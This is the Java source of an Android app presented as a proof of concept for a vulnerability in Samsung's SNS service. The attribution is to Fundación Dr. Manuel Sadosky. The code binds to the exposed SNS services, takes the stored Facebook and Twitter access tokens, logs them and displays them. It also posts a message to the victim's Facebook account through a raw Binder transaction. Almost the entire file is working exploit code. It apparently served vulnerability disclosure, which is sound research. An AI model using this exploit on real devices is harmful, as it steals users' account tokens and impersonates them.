/*******************************************************************************
 * Copyright (c) 2014, Fundación Dr. Manuel Sadosky. Todos los derechos reservados.
 * 
 * La redistribución y el uso en las formas de código fuente y binario, con o sin
 * modificaciones, están permitidos siempre que se cumplan las siguientes condiciones:
 * 
 * 1. Las redistribuciones del código fuente deben conservar el aviso de copyright
 * anterior, esta lista de condiciones y el siguiente descargo de responsabilidad.
 * 
 * 2. Las redistribuciones en formato binario deben reproducir el aviso de copyright
 * anterior, esta lista de condiciones y la siguiente renuncia en la documentación
 * y/u otros materiales suministrados con la distribución.
 * 
 * ESTE SOFTWARE SE SUMINISTRA POR LA Fundación Dr. Manuel Sadosky ''COMO ESTÁ'' Y CUALQUIER
 * GARANTÍA EXPRESA O IMPLÍCITAS, INCLUYENDO, PERO NO LIMITADO A, LAS GARANTÍAS
 * IMPLÍCITAS DE COMERCIALIZACIÓN Y APTITUD PARA UN PROPÓSITO DETERMINADO SON
 * RECHAZADAS. EN NINGÚN CASO Fundación Dr. Manuel Sadosky SERÁ RESPONSABLE POR NINGÚN
 * DAÑO DIRECTO, INDIRECTO, INCIDENTAL, ESPECIAL, EJEMPLAR O CONSECUENTE (INCLUYENDO,
 * PERO NO LIMITADO A, LA ADQUISICIÓN DE BIENES O SERVICIOS; LA PÉRDIDA DE USO, DE
 * DATOS O DE BENEFICIOS; O INTERRUPCIÓN DE LA ACTIVIDAD EMPRESARIAL) O POR
 * CUALQUIER TEORÍA DE RESPONSABILIDAD, YA SEA POR CONTRATO, RESPONSABILIDAD ESTRICTA
 * O AGRAVIO (INCLUYENDO NEGLIGENCIA O CUALQUIER OTRA CAUSA) QUE SURJA DE CUALQUIER
 * MANERA DEL USO DE ESTE SOFTWARE, INCLUSO SI SE HA ADVERTIDO DE LA POSIBILIDAD DE
 * TALES DAÑOS.
 * 
 * Las opiniones y conclusiones contenidas en el software y la documentación son las
 * de los autores y no deben interpretarse como la representación de las políticas
 * oficiales, ya sea expresa o implícita, de Fundación Dr. Manuel Sadosky .
 * 
 * Prueba de concepto de vulnerabilidad de SNS
 * Author: Joaquín Rinaudo
 ******************************************************************************/
package ar.sadosky.exploit.samsungsns;

import java.util.Arrays;
import java.util.Map;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import com.sec.android.app.sns3.svc.sp.facebook.auth.api.ISnsFacebookForAuthToken;
import com.sec.android.app.sns3.svc.sp.facebook.api.ISnsFacebook;
import com.sec.android.app.sns3.svc.sp.facebook.api.ISnsFacebookCallbackID;
import com.sec.android.app.sns3.svc.sp.facebook.api.response.SnsFbResponseID;
import com.sec.android.app.sns3.svc.sp.twitter.auth.api.ISnsTwitterForAuthToken;

public class SamsungSNS extends Activity {
	private ISnsFacebookForAuthToken service_auth = null;
	private ISnsFacebook service_fb = null;
	private ISnsTwitterForAuthToken service_tw_auth = null;

	private ServiceConnection svcConn_twitter_auth = new ServiceConnection() {

		public void onServiceConnected(ComponentName className, IBinder binder) {
			Log.d("DEBUG", "service connected");
			service_tw_auth = ISnsTwitterForAuthToken.Stub.asInterface(binder);
		}

		public void onServiceDisconnected(ComponentName className) {
			service_tw_auth = null;
		}
	};

	private ServiceConnection svcConn_auth = new ServiceConnection() {

		public void onServiceConnected(ComponentName className, IBinder binder) {
			service_auth = ISnsFacebookForAuthToken.Stub.asInterface(binder);
		}

		public void onServiceDisconnected(ComponentName className) {
			service_auth = null;
		}
	};

	private ServiceConnection svcConn_fb = new ServiceConnection() {

		public void onServiceConnected(ComponentName className, IBinder binder) {
			service_fb = ISnsFacebook.Stub.asInterface(binder);
		}

		public void onServiceDisconnected(ComponentName className) {
			service_fb = null;
		}
	};

	public void alert(String title, String message) {
		AlertDialog.Builder builder = new AlertDialog.Builder(SamsungSNS.this);

		builder.setTitle(title).setMessage(message)
				.setPositiveButton("OK", null).show();

	}

	@Override
	public void onCreate(Bundle icicle) {
		super.onCreate(icicle);
		setContentView(R.layout.main);

		Button btn_get = (Button) findViewById(R.id.get_access_token);
		Button btn_twitter_get = (Button) findViewById(R.id.get_twitter_access_token);
		Button btn_post = (Button) findViewById(R.id.post_fb);
		
		String versionName = null;
		try {
			versionName = getPackageManager().getPackageInfo("com.sec.android.app.sns3", 0).versionName;
		} catch (NameNotFoundException e1) {
			alert("SNS application not found ","");

		}
		Log.d("DEBUG",versionName);
		if (versionName != null && ! ( versionName.equals("1.1.0") || versionName.equals("1.1.1") )) {
			btn_twitter_get.setOnClickListener(new View.OnClickListener() {
				public void onClick(View view) {
					try {
						Map map = service_tw_auth.getAuthTokenInfo();
						String tokens = Arrays.toString(map.entrySet()
								.toArray());
						Log.d("DEBUG", tokens);
						alert("Twitter Acess tokens: ", tokens);
					} catch (android.os.RemoteException e) {
						alert("Exception: ", e.toString());
					}
				}
			});
		}
		else{
			btn_twitter_get.setEnabled(false);
			btn_twitter_get.append("\n(Not enabled in this Android version)");
		}

		btn_get.setOnClickListener(new View.OnClickListener() {
			public void onClick(View view) {
				try {
					Map map = service_auth.getAuthTokenNExpires();
					String tokens = Arrays.toString(map.entrySet().toArray());
					Log.d("DEBUG", tokens);
					alert("Facebook Acess tokens: ", tokens);
				} catch (android.os.RemoteException e) {
					alert("Exception: ", e.toString());
				}
			}
		});

		btn_post.setOnClickListener(new View.OnClickListener() {
			public void onClick(View view) {
				try {
					ISnsFacebookCallbackID callback = new ISnsFacebookCallbackID.Stub() {

						@Override
						public void onResponse(int r1i, boolean r2z, int r3i,
								int r4i, Bundle bundle,
								SnsFbResponseID r6_SnsFbResponseID)
								throws RemoteException {
							Log.d("DEBUG", "1 " + r1i);
							Log.d("DEBUG", "2 " + r2z);
							Log.d("DEBUG", "3 " + r3i);
							Log.d("DEBUG", "3 " + r4i);
							for (String key : bundle.keySet()) {
								Object value = bundle.get(key);
								Log.d("DEBUG", String.format("%s %s (%s)", key,
										value.toString(), value.getClass()
												.getName()));
							}
						}
					};
					// Doing it with transact
					Bundle b = new Bundle();
					b.putString("message", "Hackers o dominados");
					Log.d("DEBUG", "calling service");
					Parcel req = Parcel.obtain();
					req.writeInterfaceToken("com.sec.android.app.sns3.svc.sp.facebook.api.ISnsFacebook");
					req.writeString("me");
					req.writeInt(1);
					req.writeBundle(b);
					req.writeStrongBinder(callback.asBinder());
					Parcel rep = Parcel.obtain();
					service_fb.asBinder().transact(11, req, rep, 0);
					Log.d("DEBUG", "response is " + rep.readInt());
					req.recycle();
					rep.recycle();

				} catch (android.os.RemoteException e) {
					alert("Exception: ", e.toString());
				}
			}
		});

		bindService(
				new Intent(
						"com.sec.android.app.sns3.svc.sp.twitter.auth.api.ISnsTwitterForAuthToken"),
				svcConn_twitter_auth, Context.BIND_AUTO_CREATE);

		bindService(
				new Intent(
						"com.sec.android.app.sns3.svc.sp.facebook.auth.api.ISnsFacebookForAuthToken"),
				svcConn_auth, Context.BIND_AUTO_CREATE);

		bindService(new Intent(
				"com.sec.android.app.sns3.svc.sp.facebook.api.ISnsFacebook"),
				svcConn_fb, Context.BIND_AUTO_CREATE);
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		unbindService(svcConn_fb);
		unbindService(svcConn_twitter_auth);
		unbindService(svcConn_auth);
	}
}
